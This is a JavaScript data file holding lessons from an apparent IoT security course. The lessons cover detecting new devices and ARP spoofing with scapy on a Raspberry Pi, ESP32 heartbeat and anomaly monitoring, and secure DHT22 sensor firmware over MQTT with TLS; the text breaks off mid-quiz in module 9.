// NetWatch Academy — 🔌 IoT Security: ESP32 & Raspberry Pi (English, modules 8-10)
// Defensive use only: test on YOUR OWN devices. Format: academy/FORMAT.md
(function () {
  'use strict';
  const fx = s => s;  // (the engine now protects the * inside `code`)
  const L = (...a) => fx(a.join('\n'));
  const R = String.raw;
  const text = (...a) => ({ t: 'text', md: L(...a) });
  const tip = (...a) => ({ t: 'tip', md: L(...a) });
  const warn = (...a) => ({ t: 'warn', md: L(...a) });
  const code = (lang, title, src, explain) => ({ t: 'code', lang, title, code: src.replace(/^\n/, '').replace(/\n\s*$/, ''), explain });
  const quiz = (q, opts, ok, why) => ({ t: 'quiz', q: fx(q), opts: opts.map(fx), ok, why: fx(why) });
  const anim = (scene, caption) => ({ t: 'anim', scene, caption });
  const nw = (tab, md) => ({ t: 'netwatch', tab, md });
  const table = (head, rows) => ({ t: 'table', head, rows });
  const cli = (title, prompt, banner, steps, done) => ({ t: 'cli', title, prompt, banner, steps, done });

  const RED = '#ff3b5c', GREEN = '#3ddc97', YEL = '#ffd23f', BLUE = '#3ec5ff', PURP = '#b388ff';

  const M = [];

  // ====================================================================
  // MODULE 8 — Monitoring
  // ====================================================================
  M.push({
    id: 'iot-8', order: 8, title: 'Monitoring: the Pi as a small IDS',
    desc: 'NetWatch on the Raspberry Pi, scapy for new devices and ARP spoofing, heartbeat and anomaly detection from the ESP32s.',
    lessons: [
      {
        id: 'iot-8-1', title: 'NetWatch on the Pi and new-device detection with scapy', minutes: 18,
        goal: 'Run **NetWatch** on the Raspberry Pi and view it safely from your laptop, and write your own **new-device** detector with scapy.',
        blocks: [
          text(
            'Prevention (hardening, TLS, firewall) is never 100%. You also need **detection**: knowing when something changes. A Raspberry Pi that runs 24/7 is an ideal "guard" for your network.',
            '',
            'If the Pi is the IoT **gateway** (Module 7.2), all the ESP32 traffic goes through its `wlan0`, so it sees all of it.'
          ),
          code('bash', 'NetWatch on the Raspberry Pi', R`
sudo apt install -y git python3-venv libpcap-dev
git clone <the-netwatch-repo> ~/netwatch     # or copy the folder with scp
cd ~/netwatch
./run.sh --no-open -i wlan0          # wlan0 = the gateway's IoT network (or eth0)

# From your LAPTOP: SSH tunnel to the Pi
ssh -N -L 8765:127.0.0.1:8765 maria@pi-broker.local
# and open in the browser: http://127.0.0.1:8765
`, L(
            '- `run.sh` creates the `.venv` by itself and installs the requirements the first time. Live capture needs `sudo`.',
            '- `--no-open`: it does not try to open a browser (the Pi is headless).',
            '- `-i wlan0`: listens on the IoT interface. On `eth0` you would see the Pi\'s own traffic and your home broadcast.',
            '- NetWatch listens **only** on `127.0.0.1:8765`. It is not exposed to the network: you view it through an **SSH tunnel** (`-L`), which is encrypted and needs your key.',
            '- `-N`: SSH does not open a shell, only the tunnel.',
            '- There is also `docker compose up` (Linux), if you prefer a container.'
          )),
          nw('devs', 'In NetWatch\'s **Devices** list, every unknown device that appears on the network raises a "New device on Wi‑Fi" alert.'),
          text(
            '### Build your own detector with scapy',
            'To understand **how** such a detector works, write a small one: it listens for **ARP** (every IPv4 device sends ARP) and **DHCP** (for the hostname), remembers which MACs it has seen, and alerts on new ones.'
          ),
          code('bash', 'Install scapy in the venv', R`
~/iot-venv/bin/pip install scapy paho-mqtt
# Sniffing needs root: run the venv's python with sudo
sudo ~/iot-venv/bin/python new_devices.py
`, L(
            '- scapy reads raw packets, which requires root privileges (or `CAP_NET_RAW`).'
          )),
          code('python', 'new_devices.py: alert on new devices', R`
#!/usr/bin/env python3
"""Passive new-device detector (ARP + DHCP) with an active ARP scan every 10 min."""
import json
import os
import threading
import time
from scapy.all import ARP, DHCP, Ether, sniff, srp

IFACE = "wlan0"                       # or eth0
SUBNET = "10.42.0.0/24"               # the network of IFACE
DB = "/var/lib/iotwatch/known.json"

os.makedirs(os.path.dirname(DB), exist_ok=True)
try:
    known = json.load(open(DB))
except (OSError, ValueError):
    known = {}
lock = threading.Lock()


def alert(text):
    print(time.strftime("%F %T"), "🚨", text, flush=True)
    # Here you can send MQTT/Telegram (see monitor.py in 8.3)


def seen(mac, ip, hostname=None, how="arp"):
    mac = mac.lower()
    if mac in ("00:00:00:00:00:00", "ff:ff:ff:ff:ff:ff"):
        return
    with lock:
        dev = known.get(mac)
        if dev is None:
            known[mac] = {"ip": ip, "host": hostname, "first": time.time(), "last": time.time()}
            alert(f"NEW device {mac} ip={ip} host={hostname} ({how})")
        else:
            if ip and ip != "0.0.0.0" and dev["ip"] != ip:
                print(f"ℹ️  {mac}: IP {dev['ip']} → {ip}")
                dev["ip"] = ip
            if hostname:
                dev["host"] = hostname
            dev["last"] = time.time()
        json.dump(known, open(DB, "w"), indent=1)


def dhcp_hostname(pkt):
    for opt in pkt[DHCP].options:
        if isinstance(opt, tuple) and opt[0] == "hostname":
            return opt[1].decode(errors="replace")[:32]
    return None


def handle(pkt):
    if ARP in pkt and pkt[ARP].op in (1, 2):           # who-has / is-at
        seen(pkt[ARP].hwsrc, pkt[ARP].psrc)
    elif DHCP in pkt and Ether in pkt:
        seen(pkt[Ether].src, None, dhcp_hostname(pkt), how="dhcp")


def active_scan():
    while True:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=SUBNET),
                     iface=IFACE, timeout=3, verbose=False)
        for _, r in ans:
            seen(r[ARP].hwsrc, r[ARP].psrc, how="scan")
        time.sleep(600)


print(f"Known devices: {len(known)}. Listening on {IFACE}…")
threading.Thread(target=active_scan, daemon=True).start()
sniff(iface=IFACE, filter="arp or (udp and (port 67 or port 68))", prn=handle, store=False)
`, L(
            '- **Passively:** every device sends ARP to find the gateway, and DHCP when it joins the network. We do not need to "poke" anyone.',
            '- `pkt[ARP].op in (1, 2)`: 1 = who-has (question), 2 = is-at (answer). Both reveal the sender\'s MAC + IP.',
            '- **DHCP option `hostname`**: this is where you see the `sensor01` you set with `WiFi.setHostname()`. We cut it to 32 characters (data from the network = untrusted).',
            '- **Actively:** every 10 minutes, an ARP scan of the whole subnet (`srp` = send/receive at layer 2) also catches the devices that stay silent.',
            '- `filter=…`: a BPF filter in the kernel, so Python only sees ARP/DHCP (less CPU on the Pi).',
            '- `store=False`: it does not keep packets in memory (otherwise the RAM fills up in a few days).',
            '- The known devices are kept in JSON. The first time it "learns" the whole network (baseline). After that, every new MAC = an alert.'
          )),
          tip('Many phones use a **random MAC** (private Wi‑Fi address) per network. On the IoT network, though, ESP32s have a fixed MAC, so **every** new MAC there is worth a look.'),
          quiz('Why do we view NetWatch on the Pi through `ssh -L` instead of opening it on `0.0.0.0`?',
            ['Because it is faster', 'Because the interface is not exposed to anyone on the network; access needs your SSH key and is encrypted', 'Because NetWatch does not work any other way on the Pi', 'So that sudo is not needed'], 1,
            'A security tool holding information about the whole network must not become a target itself. The SSH tunnel keeps it private.'),
          quiz('Why does `new_devices.py` listen to DHCP as well, not only ARP?',
            ['DHCP is faster', 'To learn the device\'s hostname (option 12) and catch it the moment it joins the network', 'Because ARP is encrypted', 'It does not need to'], 1,
            'The DHCP request comes first, as soon as the device connects, and often contains its name. Very useful for figuring out **what** it is.'),
        ],
      },
      {
        id: 'iot-8-2', title: 'Detecting ARP spoofing with scapy', minutes: 15,
        goal: 'Understand how **ARP spoofing** (MITM on the LAN) works and write a detector that alerts when the gateway\'s MAC changes or when it sees a "rain" of ARP replies.',
        blocks: [
          text(
            '**ARP** maps IP to MAC inside the LAN and has **no authentication at all**: whoever answers is believed. The attacker keeps sending "192.168.1.1 is at my MAC" and all the traffic to the Internet passes through them (**Man-in-the-Middle**).',
            '',
            'For your ESP32s this means: anything that is **not** TLS can be read and altered. That is why TLS with a CA (Module 4) is the real defence, and detection tells you **that** someone is trying it.'
          ),
          anim('iot-arp-spoof', 'The Pi keeps a baseline for the gateway\'s MAC and shouts as soon as it changes.'),
          code('python', 'arp_guard.py: ARP spoofing detector', R`
#!/usr/bin/env python3
"""ARP spoofing detection: MAC change for a known IP, especially the gateway's."""
import time
from collections import defaultdict, deque
from scapy.all import ARP, Ether, conf, getmacbyip, sniff

IFACE = "eth0"
GATEWAY = conf.route.route("0.0.0.0")[2]          # the IP of the default gateway
GW_MAC = (getmacbyip(GATEWAY) or "").lower()       # baseline via active ARP
print(f"Gateway {GATEWAY} = {GW_MAC}")

table = {}                                         # ip -> mac (what we have learned)
replies = defaultdict(lambda: deque(maxlen=50))    # mac -> is-at times
last_alert = {}


def alert(key, text, every=60):
    now = time.time()
    if now - last_alert.get(key, 0) > every:       # no spam: 1 alert/minute
        last_alert[key] = now
        print(time.strftime("%F %T"), "🚨", text, flush=True)


def handle(pkt):
    if ARP not in pkt or pkt[ARP].op != 2:         # only is-at (replies)
        return
    ip, mac = pkt[ARP].psrc, pkt[ARP].hwsrc.lower()

    # 1) The gateway's MAC changed → almost certainly MITM
    if ip == GATEWAY and GW_MAC and mac != GW_MAC:
        alert(("gw", mac), f"ARP SPOOF of the gateway! {ip} is-at {mac} (correct: {GW_MAC})")

    # 2) Any IP that changed MAC
    old = table.get(ip)
    if old and old != mac:
        alert(("chg", ip), f"{ip} changed MAC: {old} → {mac}")
    table[ip] = mac

    # 3) Ethernet src ≠ ARP src: forged packet
    if Ether in pkt and pkt[Ether].src.lower() != mac:
        alert(("eth", mac), f"MAC mismatch: Ethernet {pkt[Ether].src} vs ARP {mac}")

    # 4) Far too many is-at from the same MAC (spoofing tools send every 1-2s)
    q = replies[mac]
    q.append(time.time())
    if len(q) >= 20 and q[-1] - q[0] < 30:
        alert(("rate", mac), f"{mac}: {len(q)} ARP replies in {q[-1] - q[0]:.0f}s (suspicious)")


sniff(iface=IFACE, filter="arp", prn=handle, store=False)
`, L(
            '- `conf.route.route("0.0.0.0")[2]`: scapy\'s routing table gives the IP of the default gateway.',
            '- `getmacbyip()`: sends an ARP request and gets the **correct** MAC at the start (baseline). If the attacker is already active when you start, the baseline may be wrong: that is why it is a good idea to enter the router\'s MAC **by hand** (you can see it on its label or in NetWatch).',
            '- Check 1: the most important one. The gateway\'s MAC rarely changes (only if you replace the router).',
            '- Check 3: many tools put a different MAC in the Ethernet header than the one inside the ARP.',
            '- Check 4: `deque(maxlen=50)` keeps the latest times. 20 replies in 30s from one MAC is far above normal.',
            '- `alert(…, every=60)`: rate limiting of alerts, so you do not "drown" in noise.'
          )),
          code('bash', 'Run it as a systemd service', R`
sudo tee /etc/systemd/system/arp-guard.service >/dev/null <<'EOF'
[Unit]
Description=ARP spoofing detector
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/home/maria/iot-venv/bin/python /home/maria/arp_guard.py
Restart=always
RestartSec=10
# Needs only raw sockets, not full root
AmbientCapabilities=CAP_NET_RAW CAP_NET_ADMIN
CapabilityBoundingSet=CAP_NET_RAW CAP_NET_ADMIN
User=maria
NoNewPrivileges=yes
ProtectSystem=strict

[Install]
WantedBy=multi-user.target
EOF
sudo systemctl daemon-reload
sudo systemctl enable --now arp-guard
journalctl -u arp-guard -f
`, L(
            '- `AmbientCapabilities=CAP_NET_RAW`: the user `maria` (not root) can sniff. **Principle of least privilege.**',
            '- `NoNewPrivileges`, `ProtectSystem=strict`: even if the script is compromised (e.g. a parsing bug), it cannot write to the system and does not get root.',
            '- `Restart=always`: if it crashes, it restarts in 10s.',
            '- Alerts go to the journal: `journalctl -u arp-guard -f`.'
          )),
          nw('alerts', 'NetWatch detects ARP spoofing automatically and shows it under **Attacks** (MITRE T1557.002). Compare its alerts with your own script.'),
          tip('For devices that stay in one place (Pi broker, NAS), you can add a **static ARP entry** for the gateway: `sudo ip neigh replace 192.168.1.1 lladdr a4:2b:b0:11:22:33 dev eth0 nud permanent`. Then forged ARP replies are ignored.'),
          quiz('ARP spoofing succeeds. What can the attacker **not** do to your ESP32\'s MQTT (TLS with your own CA)?',
            ['See that there is traffic to the broker', 'Read or change the messages and the password', 'Cut the connection (DoS)', 'See the IPs'], 1,
            'They see metadata and can cut the connection, but the **content** is protected by TLS and the CA check.'),
          quiz('Which signal is the **strongest** for ARP spoofing on a home network?',
            ['A new device on the network', 'The gateway\'s IP suddenly answers with a different MAC', 'An ARP request', 'A device changed IP via DHCP'], 1,
            'The gateway is the main target of a MITM and its MAC practically never changes.'),
        ],
      },
      {
        id: 'iot-8-3', title: 'Heartbeat, logging and anomaly detection', minutes: 20,
        goal: 'Make the ESP32s send a **heartbeat** with health metrics (uptime, RSSI, heap, reset reason, BSSID), and write a `monitor.py` on the Pi that detects silence, reboots and anomalies.',
        blocks: [
          text(
            'A compromised or broken device often **behaves differently** before it does anything obviously bad:',
            '- It stops sending (someone unplugged it, or it crashes).',
            '- It **reboots** (crash from malicious input, brownout, watchdog).',
            '- The **RSSI** or **BSSID** changes suddenly (it connected to another AP: evil twin?).',
            '- The **free memory** keeps dropping (memory leak, or something is running that should not be).',
            '- It sends **many more** messages than usual.',
            '- It sends values **outside physical limits** (temperature 300°C).'
          ),
          anim('iot-heartbeat', 'Heartbeat + Last Will: the monitor always knows who is alive and whether it is behaving normally.'),
          code('cpp', 'heartbeat.h: health metrics from the ESP32', R`
#pragma once
#include <WiFi.h>
#include <PubSubClient.h>
#include <esp_system.h>

extern PubSubClient mqtt;

static const char* resetReasonStr() {
  switch (esp_reset_reason()) {
    case ESP_RST_POWERON:   return "poweron";
    case ESP_RST_SW:        return "software";
    case ESP_RST_PANIC:     return "panic";          // crash!
    case ESP_RST_INT_WDT:
    case ESP_RST_TASK_WDT:
    case ESP_RST_WDT:       return "watchdog";       // it hung
    case ESP_RST_BROWNOUT:  return "brownout";       // voltage drop
    case ESP_RST_DEEPSLEEP: return "deepsleep";
    default:                return "other";
  }
}

// Called e.g. every 60s from loop()
void publishHeartbeat(const char* topic, const char* fwVersion) {
  char buf[256];
  int n = snprintf(buf, sizeof(buf),
    "{\"fw\":\"%s\",\"up\":%lu,\"rssi\":%d,\"bssid\":\"%s\","
    "\"heap\":%u,\"minheap\":%u,\"reset\":\"%s\"}",
    fwVersion,
    (unsigned long)(millis() / 1000),
    WiFi.RSSI(),
    WiFi.BSSIDstr().c_str(),
    (unsigned)ESP.getFreeHeap(),
    (unsigned)ESP.getMinFreeHeap(),
    resetReasonStr());
  if (n > 0 && n < (int)sizeof(buf)) mqtt.publish(topic, buf);
}
`, L(
            '- `esp_reset_reason()`: **why** the last boot happened. Many `panic` = something is crashing the device (a bug, or an attack with bad input).',
            '- `up` (uptime in seconds): if it gets smaller, the device rebooted.',
            '- `bssid`: the MAC of the AP it is connected to. If it changes when you have no mesh, something is going on.',
            '- `minheap`: the lowest free memory since boot. Good for finding leaks.',
            '- `snprintf` + checking `n`: if the JSON does not fit, we do not send cut (invalid) JSON.'
          )),
          code('cpp', 'Watchdog: if the loop hangs, reset (Arduino core 3.x)', R`
#include <esp_task_wdt.h>

void setupWatchdog() {
  esp_task_wdt_config_t cfg = {
    .timeout_ms = 30000,          // 30s without a reset → panic → reboot
    .idle_core_mask = 0,
    .trigger_panic = true,
  };
  if (esp_task_wdt_reconfigure(&cfg) != ESP_OK) esp_task_wdt_init(&cfg);
  esp_task_wdt_add(NULL);         // watch the current task (loop)
}

// In loop():  esp_task_wdt_reset();
`, L(
            '- The **Task Watchdog** reboots the device if the task does not "feed" the watchdog (`esp_task_wdt_reset()`) for 30s.',
            '- In Arduino core 3.x (ESP-IDF 5) the setup is done with `esp_task_wdt_config_t`. The watchdog is usually already initialised, so first `reconfigure` and if that fails `init`.',
            '- After such a reset, the heartbeat will report `"reset":"watchdog"` and the monitor will see it.'
          )),
          code('python', 'monitor.py: watch heartbeats and anomalies on the Pi', R`
#!/usr/bin/env python3
"""Heartbeat monitor: silence, reboots, BSSID change, RSSI, memory, message rate."""
import json
import os
import ssl
import time
from collections import deque
import paho.mqtt.client as mqtt

BROKER, CA = "pi-broker.local", "/etc/mosquitto/certs/ca.crt"
HB_EVERY = 60                    # devices send every 60s
SILENCE = 3 * HB_EVERY           # 3 missed heartbeats → alert
MAX_MSGS_PER_MIN = 30

devs = {}                        # device -> state


def state(dev):
    return devs.setdefault(dev, {"last": time.time(), "up": None, "bssid": None,
                                 "rssi": None, "heap": deque(maxlen=60),
                                 "msgs": deque(maxlen=200), "silent": False})


def alert(client, dev, text):
    line = f"{time.strftime('%F %T')} [{dev}] {text}"
    print("🚨", line, flush=True)
    client.publish(f"alerts/{dev}", text, qos=1)      # the monitor has write on alerts/#


def on_connect(c, userdata, flags, rc, props):
    if rc.is_failure:
        print("connection failed:", rc)
        return
    c.subscribe([("home/+/heartbeat", 1), ("home/+/status", 1), ("home/+/state", 0)])


def on_message(c, userdata, msg):
    parts = msg.topic.split("/")
    if len(parts) != 3:
        return
    dev, kind = parts[1], parts[2]
    s = state(dev)
    now = time.time()
    s["last"] = now
    s["msgs"].append(now)
    if s["silent"]:
        s["silent"] = False
        alert(c, dev, "back online")

    # Message rate
    recent = [t for t in s["msgs"] if now - t < 60]
    if len(recent) > MAX_MSGS_PER_MIN:
        alert(c, dev, f"unusually many messages: {len(recent)}/min")

    if kind == "status" and msg.payload == b"offline":
        alert(c, dev, "offline (Last Will)")
        return
    if kind != "heartbeat":
        return
    try:
        hb = json.loads(msg.payload)
        up, rssi, bssid = int(hb["up"]), int(hb["rssi"]), str(hb["bssid"])[:17]
        heap, reset = int(hb["heap"]), str(hb["reset"])[:16]
    except (ValueError, KeyError, TypeError):
        alert(c, dev, "invalid heartbeat")
        return

    if s["up"] is not None and up < s["up"]:
        alert(c, dev, f"rebooted (reset={reset})")
    if reset in ("panic", "watchdog", "brownout") and up < HB_EVERY * 2:
        alert(c, dev, f"unstable: last reset = {reset}")
    if s["bssid"] and bssid != s["bssid"]:
        alert(c, dev, f"changed AP: {s['bssid']} → {bssid} (mesh or evil twin?)")
    if s["rssi"] is not None and s["rssi"] - rssi >= 20:
        alert(c, dev, f"sudden signal drop {s['rssi']} → {rssi} dBm")
    s["heap"].append(heap)
    if len(s["heap"]) == s["heap"].maxlen and s["heap"][-1] < 0.7 * s["heap"][0]:
        alert(c, dev, f"free memory keeps dropping: {s['heap'][0]} → {heap}")
    s.update(up=up, rssi=rssi, bssid=bssid)


client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="monitor")
client.username_pw_set("monitor", os.environ["MQTT_PASS"])
client.tls_set(ca_certs=CA, cert_reqs=ssl.CERT_REQUIRED)
client.on_connect, client.on_message = on_connect, on_message
client.connect(BROKER, 8883, keepalive=60)
client.loop_start()

while True:                                   # silence check every 15s
    time.sleep(15)
    now = time.time()
    for dev, s in list(devs.items()):
        if not s["silent"] and now - s["last"] > SILENCE:
            s["silent"] = True
            alert(client, dev, f"silent for {int(now - s['last'])}s")
`, L(
            '- It connects with **TLS** as the `monitor` user, which in the ACL has `read home/#` and `write alerts/#` (Module 4.2).',
            '- **Silence:** if a device sends nothing for 3 heartbeat intervals, alert. It works even if the broker does not send the LWT (e.g. it was down too).',
            '- **Reboot:** `up` got smaller. With `reset=panic` or `watchdog`, the device is crashing: check logs/firmware.',
            '- **BSSID:** AP change. In a home with one router and no mesh, it is suspicious.',
            '- **RSSI −20 dB:** the device was moved, something got in the way, or it connected to another (farther or closer) AP.',
            '- **Heap:** if free memory dropped 30% within 60 heartbeats, something is "eating" memory.',
            '- **Rate:** more than 30 messages/minute from a sensor that sends 1–2 = a bug or a compromise.',
            '- Every JSON field is checked (type, length). A bad heartbeat = an alert, not a crash of the monitor.',
            '- `loop_start()`: paho runs in its own thread, while the main thread checks for silence.'
          )),
          tip('Alerts on `alerts/#` can go to your phone: a small script that subscribes and sends to **Telegram** (as NetWatch does), or an MQTT app on your phone (through a VPN).'),
          quiz('The heartbeat shows `"reset":"panic"` every few minutes, only when someone sends a message to the `cmd` topic. What do you suspect?',
            ['Bad Wi‑Fi', 'A bug in payload handling (e.g. a buffer overflow): someone is sending malicious input', 'Wrong NTP time', 'Nothing important'], 1,
            'Repeated crashes tied to incoming messages are a classic sign that someone is "probing" for a vulnerability in your parser. Check length limits and the ACL.'),
          quiz('Why does the monitor check for silence **as well as** the LWT `offline`, not only the LWT?',
            ['The LWT does not exist in MQTT', 'If the broker restarts or the device "freezes" with an open TCP connection, the LWT may not arrive or may be late', 'To use less CPU', 'It does not need to'], 1,
            'Defence in depth in monitoring too: two independent mechanisms catch more cases.'),
        ],
      },
    ],
  });

  // ====================================================================
  // MODULE 9 — Final project
  // ====================================================================
  M.push({
    id: 'iot-9', order: 9, title: 'Final project: a secure sensor system',
    desc: 'ESP32 + DHT22 → MQTT over TLS → Mosquitto on the Pi → dashboard. Everything you learned in one system, with a checklist and a final test.',
    lessons: [
      {
        id: 'iot-9-1', title: 'Architecture and the sensor firmware', minutes: 25,
        goal: 'See the architecture of the final system and write **complete, secure firmware** for an ESP32 with a DHT22: TLS, Last Will, heartbeat, validated commands, watchdog.',
        blocks: [
          anim('iot-final-flow', 'Every arrow has its own protection. Press ▶ and see which.'),
          table(['Part', 'Security', 'Lesson'], [
            ['ESP32 firmware', 'secrets outside Git, input validation, watchdog, no debug logs', '3.1, 5.4, 8.3'],
            ['Wi‑Fi', 'Separate IoT SSID, WPA2/WPA3, `setMinSecurity`', '3.2, 7.1, 7.2'],
            ['Transport', 'MQTT over TLS 8883, your own CA, `setCACert`', '4.3, 4.4'],
            ['Broker', 'One user per device, ACL, no anonymous, 1883 on localhost only', '4.2'],
            ['Pi', 'SSH with keys, ufw/nftables, fail2ban, unattended-upgrades', 'Module 2'],
            ['Dashboard', 'Read-only, autoescape, parameterised SQL, 127.0.0.1 + SSH tunnel', '9.2'],
            ['Monitoring', 'Heartbeat, LWT, monitor.py, NetWatch', 'Module 8'],
          ]),
          text(
            '### Parts list',
            '- ESP32 DevKit (any), a **DHT22** (AM2302) sensor, a 10k ohm resistor (if the DHT22 is not on a module with one built in).',
            '- Wiring: DHT22 **VCC → 3V3**, **GND → GND**, **DATA → GPIO4** (with a 10k ohm pull-up to 3V3).',
            '- Libraries (Library Manager): **PubSubClient**, **DHT sensor library** (Adafruit) and **Adafruit Unified Sensor**.'
          ),
          code('cpp', 'secrets.h (outside Git!)', R`
#pragma once
#define WIFI_SSID  "IoT-Net"
#define WIFI_PASS  "ONE-LONG-RANDOM-PASSWORD-24+"
#define MQTT_HOST  "pi-broker.local"       // in the SAN of server.crt
#define MQTT_PORT  8883
#define MQTT_USER  "sensor01"              // = client id = name in the topics
#define MQTT_PASS  "8f2K-vQ9x-Lm3p-Tz7w"

static const char CA_CERT[] = R"PEM(
-----BEGIN CERTIFICATE-----
...your own ca.crt...
-----END CERTIFICATE-----
)PEM";
`, L(
            '- Same structure as Module 4.4. One MQTT user **per device**.',
            '- For a 2nd sensor: same firmware, a different `secrets.h` (or provisioning from NVS, Module 3.3).'
          )),
          code('cpp', 'sensor_secure.ino: the complete firmware', R`
// Final project: DHT22 → MQTT over TLS (ESP32, Arduino core 3.x)
#include <WiFi.h>
#include <WiFiClientSecure.h>
#include <PubSubClient.h>
#include <Preferences.h>
#include <DHT.h>
#include <esp_task_wdt.h>
#include <esp_system.h>
#include <time.h>
#include "secrets.h"

#define FW_VERSION "1.0.0"
#define DHT_PIN    4
#define DHT_TYPE   DHT22

const char* DEV = MQTT_USER;
char tState[48], tStatus[48], tHeart[48], tCmd[48];

DHT dht(DHT_PIN, DHT_TYPE);
WiFiClientSecure net;
PubSubClient mqtt(net);
Preferences prefs;

uint32_t intervalS = 60;                  // measurement interval (from NVS)
uint32_t lastRead = 0, lastBeat = 0, lastTry = 0, backoffMs = 2000;

// ---------- Wi‑Fi ----------
void connectWiFi() {
  WiFi.persistent(false);
  WiFi.setHostname(DEV);
  WiFi.mode(WIFI_STA);
  WiFi.setMinSecurity(WIFI_AUTH_WPA2_PSK);
  WiFi.begin(WIFI_SSID, WIFI_PASS);
  uint32_t t0 = millis();
  while (WiFi.status() != WL_CONNECTED) {
    esp_task_wdt_reset();
    if (millis() - t0 > 20000) ESP.restart();
    delay(250);
  }
  Serial.printf("[WiFi] %s RSSI=%d\n", WiFi.localIP().toString().c_str(), WiFi.RSSI());
}

// ---------- Commands: whitelist + limits ----------
void onMessage(char* topic, byte* payload, unsigned int len) {
  char buf[32];
  if (strcmp(topic, tCmd) != 0 || len == 0 || len >= sizeof(buf)) return;
  memcpy(buf, payload, len);
  buf[len] = '\0';

  if (strcmp(buf, "ping") == 0) {
    mqtt.publish(tStatus, "online", true);
  } else if (strncmp(buf, "interval=", 9) == 0) {
    char* end = nullptr;
    long v = strtol(buf + 9, &end, 10);
    if (end && *end == '\0' && v >= 10 && v <= 3600) {     // only 10..3600 s
      intervalS = (uint32_t)v;
      prefs.begin("cfg", false);
      prefs.putUInt("interval", intervalS);
      prefs.end();
      Serial.printf("[CMD] interval=%lu\n", (unsigned long)intervalS);
    } else {
      Serial.println("[CMD] invalid interval");
    }
  } else {
    Serial.println("[CMD] unknown command");
  }
}

// ---------- MQTT ----------
bool connectMqtt() {
  if (mqtt.connect(DEV, MQTT_USER, MQTT_PASS, tStatus, 1, true, "offline")) {
    mqtt.publish(tStatus, "online", true);
    mqtt.subscribe(tCmd, 1);
    backoffMs = 2000;
    Serial.println("[MQTT] connected (TLS)");
    return true;
  }
  char err[96];
  int code = net.lastError(err, sizeof(err));
  Serial.printf("[MQTT] failed state=%d tls=%d %s\n", mqtt.state(), code, code ? err : "");
  return false;
}

// ---------- Measurements ----------
void readAndPublish() {
  float t = dht.readTemperature();
  float h = dht.readHumidity();
  if (isnan(t) || isnan(h) || t < -40 || t > 80 || h < 0 || h > 100) {
    Serial.println("[DHT] invalid reading, ignored");
    return;
  }
  char json[64];
  snprintf(json, sizeof(json), "{\"t\":%.1f,\"h\":%.1f}", t, h);
  mqtt.publish(tState, json);
}

const char* resetReasonStr() {
  switch (esp_reset_reason()) {
    case ESP_RST_POWERON:  return "poweron";
    case ESP_RST_SW:       return "software";
    case ESP_RST_PANIC:    return "panic";
    case ESP_RST_INT_WDT:
    case ESP_RST_TASK_WDT:
    case ESP_RST_WDT:      return "watchdog";
    case ESP_RST_BROWNOUT: return "brownout";
    default:               return "other";
  }
}

void heartbeat() {
  char buf[220];
  int n = snprintf(buf, sizeof(buf),
    "{\"fw\":\"%s\",\"up\":%lu,\"rssi\":%d,\"bssid\":\"%s\",\"heap\":%u,\"minheap\":%u,\"reset\":\"%s\"}",
    FW_VERSION, (unsigned long)(millis() / 1000), WiFi.RSSI(), WiFi.BSSIDstr().c_str(),
    (unsigned)ESP.getFreeHeap(), (unsigned)ESP.getMinFreeHeap(), resetReasonStr());
  if (n > 0 && n < (int)sizeof(buf)) mqtt.publish(tHeart, buf);
}

// ---------- setup / loop ----------
void setup() {
  Serial.begin(115200);
  Serial.printf("\n%s firmware %s\n", DEV, FW_VERSION);

  esp_task_wdt_config_t wdt = { .timeout_ms = 30000, .idle_core_mask = 0, .trigger_panic = true };
  if (esp_task_wdt_reconfigure(&wdt) != ESP_OK) esp_task_wdt_init(&wdt);
  esp_task_wdt_add(NULL);

  snprintf(tState,  sizeof(tState),  "home/%s/state", DEV);
  snprintf(tStatus, sizeof(tStatus), "home/%s/status", DEV);
  snprintf(tHeart,  sizeof(tHeart),  "home/%s/heartbeat", DEV);
  snprintf(tCmd,    sizeof(tCmd),    "home/%s/cmd", DEV);

  prefs.begin("cfg", true);
  intervalS = prefs.getUInt("interval", 60);
  prefs.end();

  dht.begin();
  connectWiFi();
  configTime(0, 0, "pool.ntp.org", "time.cloudflare.com");

  net.setCACert(CA_CERT);
  net.setHandshakeTimeout(15);
  mqtt.setServer(MQTT_HOST, MQTT_PORT);
  mqtt.setCallback(onMessage);
  mqtt.setBufferSize(512);
  mqtt.setKeepAlive(30);
}

void loop() {
  esp_task_wdt_reset();
  if (WiFi.status() != WL_CONNECTED) connectWiFi();

  if (!mqtt.connected()) {
    if (millis() - lastTry > backoffMs) {
      lastTry = millis();
      if (!connectMqtt()) backoffMs = min<uint32_t>(backoffMs * 2, 60000);
    }
    delay(50);
    return;
  }
  mqtt.loop();

  if (millis() - lastRead > intervalS * 1000UL) {
    lastRead = millis();
    readAndPublish();
  }
  if (millis() - lastBeat > 60000UL) {
    lastBeat = millis();
    heartbeat();
  }
  delay(10);
}
`, L(
            '- **Topics from the username**: `home/sensor01/…`. They match the ACL `pattern write home/%u/…` exactly.',
            '- **Wi‑Fi**: minimum WPA2, a timeout, nothing stored in the driver\'s NVS. The watchdog is "fed" inside the connection loop too.',
            '- **Commands**: we accept only `ping` and `interval=N` with N from 10 to 3600. `strtol` + the check `*end == \'\\0\'` rejects text such as `interval=5abc`. The new value stays in NVS.',
            '- **TLS**: `setCACert` with your own CA, a handshake timeout, error detail from `lastError()`.',
            '- **LWT** `offline` retained and `online` retained after connecting.',
            '- **DHT22**: we reject `NaN` and values outside the sensor\'s physical limits. The DHT22 needs at least 2s between readings (here: ≥10s).',
            '- **Heartbeat** every 60s, in the same format `monitor.py` expects (Module 8.3), with `reset` as text (`panic`, `watchdog`…).',
            '- **Backoff** up to 60s, **watchdog** 30s, and no secrets on Serial.',
            '- `designated initializers` (`.timeout_ms = …`) in field order: supported by the Arduino core 3.x compiler.'
          )),
          warn('Before you mount it on the wall: Core Debug Level **None**, OTA **off** (or protected with a password and a time window), and if the device will be somewhere other people can reach, seriously consider **Secure Boot + Flash Encryption** (Module 5), built with ESP-IDF/PlatformIO.'),
          quiz('An attacker sends `interval=1` to `home/sensor01/cmd`. What happens?',
            ['The device sends every 1s and floods the broker', 'It is rejected: only values 10–3600 are accepted. And if the ACL gives them no write access to cmd, it does not even arrive', 'The device crashes', 'The Wi‑Fi changes'], 1,
            'Two layers: the **ACL** on the broker (who writes to `cmd`) and the **limit check** on the device.'),
          quiz('Why are the topics built from `MQTT_USER`?',
